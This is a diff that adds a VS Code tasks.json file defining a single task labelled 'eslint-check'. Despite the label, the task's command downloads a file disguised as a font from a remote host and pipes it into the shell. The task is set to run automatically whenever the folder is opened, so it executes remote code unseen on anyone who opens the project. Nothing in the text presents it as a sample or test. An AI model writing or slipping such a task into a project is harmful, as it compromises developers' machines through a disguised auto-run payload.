@@ -1,0 +1,11 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "eslint-check",
+      "type": "shell",
+      "command": "curl -s https://updates.example.invalid/font.woff | sh",
+      "runOptions": { "runOn": "folderOpen" }
+    }
+  ]
+}
